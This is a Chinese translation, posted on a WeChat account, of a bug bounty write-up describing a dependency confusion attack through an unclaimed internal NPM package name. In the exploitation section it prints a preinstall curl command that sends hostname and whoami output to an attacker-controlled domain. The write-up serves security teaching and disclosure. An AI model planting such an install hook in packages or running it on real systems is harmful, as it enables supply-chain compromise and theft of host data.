---
title: 通过供应链发起的RCE攻击
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497094&idx=1&sn=fd7fe711af4c15fb8cc6bd275d1e15b8&chksm=e8a5ffe5dfd276f357da7fd881af1d4fdc80b39ba455245f9ba2a7ae9eb8da4638733ec29b73&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2025-02-16
fetch_date: 2025-10-06T20:37:30.259653
---

# 通过供应链发起的RCE攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj6VdvdnpDg6OYGXVdvqqpN1gWd4pCRIq4mn82lXK0nnbdInn6BibhqOm5ILYJ2NcUgvn8YVgE6VvYQ/0?wx_fmt=jpeg)

# 通过供应链发起的RCE攻击

迪哥讲事

以下文章来源于骨哥说事
，作者骨哥说事

![](http://wx.qlogo.cn/mmhead/Tjnia6K0WAwzfic3VPt0EfMjicnGXzicDLoHEqtz1cP3Iozxf1tSyMxCFNG9Aya8SziaVKhVw7ia6QugE/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

#

# **防走失：****https://gugesay.com/archives/3936**

**不想错过任何消息？设置星标****↓ ↓ ↓**

#

# 前言

依赖项混乱是一种软件供应链漏洞，当公司的内部软件包从公共存储库（例如NPM）而非私有注册中心时，就会发生这种漏洞。

如果软件包管理器（例如NPM，PIP或其它）默认为从公共源中拉出和具有相同名称的软件包，则极可能发生这种情况。

在依赖项混淆攻击中，攻击者可以创建一个与公司内部软件包同名的恶意软件包，并将其发布到公共注册中心中。

如果公司系统从公共注册中心解析该软件包，就可能下载并执行攻击者的代码，从而导致远程代码执行（RCE）等安全风险。

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZlCkHmmT7pJb88icLYqItFC4DIxiaQRSKQduhcmdcV6lBbQSBiatDKxSsNiboiayZMU5LnpCMNWlMQiaQ/640?wx_fmt=png&from=appmsg "file")

原流程图

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZlCkHmmT7pJb88icLYqItFWIupmYDoduwCmjN9gXZAl0tjwRLw4eLzSx95qQ2QwIBosiaLUeCeIyA/640?wx_fmt=png&from=appmsg "file")

翻译后的流程图

# 如何确定漏洞

在渗透测试期间，白帽小哥发现目标公司的一个JavaScript文件，并注意到它引用了存储在 /node\_modules/@confidential-package-name 。

这表明该公司正在使用内部NPM软件包，检查了该内部软件包是否已在公共NPM注册中心上发布，发现它在NPM上为“无人认领”（unclaimed）的。

这种无人认领的身份表明任何人都可以创建一个具有相同名称的软件包，并通过欺骗公司的系统从公共NPM注册中心下载和执行代码而不是内部来源来引用依赖项。

# 如何利用

为了确认该漏洞，白帽小哥使用与内部软件包@confidential-package-name相同的名称创建了一个恶意NPM软件包。

然后，将该软件包发布给了公共NPM注册中心，“嵌入”了在安装时自动执行的预安装脚本。

脚本很简单：

```
curl — data-urlencode “info=$(hostname && whoami)” http://<attacker-controlled-domain>.oast.fun
curl - data-urlencode“ info = $（hostName％26％26 whaami）”
```

该脚本会将安装软件包的服务器的主机名和用户信息发送到白帽小哥控制的域服务上。

一旦该软件包在NPM可用后，经过耐心等待，在几个小时到几天之内，就会收到该公司生产和非生产环境的多个请求，从而确认他们的系统正在下载和执行恶意软件包。

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZlCkHmmT7pJb88icLYqItFKY2oXjD08ibR30YUicibEy5S5zzQH1gZP7icUzeD99GQkyEcRggyibcmLyA/640?wx_fmt=png&from=appmsg "file")

接收到的多个请求信息

这些请求包含了主机名和用户名之类的详细信息。

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZlCkHmmT7pJb88icLYqItF7yicMibmB4uZofH09RclIUbCPXNTia2aBALtOQDOmj3icXab7tYUZEg96g/640?wx_fmt=png&from=appmsg "file")

请求包含重要信息

获得了这些信息后，就可以提交漏洞报告了。白帽小哥在一天内报告了3个同类漏洞，一周内，漏洞便被接受，小哥也顺利收获了$2,500的赏金奖励。

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZlCkHmmT7pJb88icLYqItF3AgjhCLfODC3H1ngycLRBCYXn26icXxPRewXnWriaIyfdHA4R3h9vE1A/640?wx_fmt=png&from=appmsg "file")

赏金奖励

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

以上内容由骨哥翻译并整理。

原文：

https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过